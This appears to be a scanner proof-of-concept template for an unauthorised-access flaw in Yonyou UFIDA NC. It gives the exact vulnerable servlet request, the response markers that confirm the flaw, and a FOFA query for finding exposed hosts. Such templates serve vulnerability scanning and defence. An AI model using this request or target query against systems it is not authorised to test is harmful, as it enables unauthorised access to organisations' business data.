id: poc-yaml-yongyou-ufida-nc-anthentication-bypass
info:
  name: 用友UFIDA NC未授权访问
  severity: high
  tags:
  - 未授权访问
  finger: ufida-nc
  fofa: app="用友-UFIDA-NC"
requests:
- method: GET
  path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease&TreeSelectedID=&TableSelectedID=
  expression: 'status_code == 200 &&

    contains(body,"发布 - IUFO") &&

    contains(body,"/iufo/web/images/clocks.gif")

    '
variables: {}
transport: http
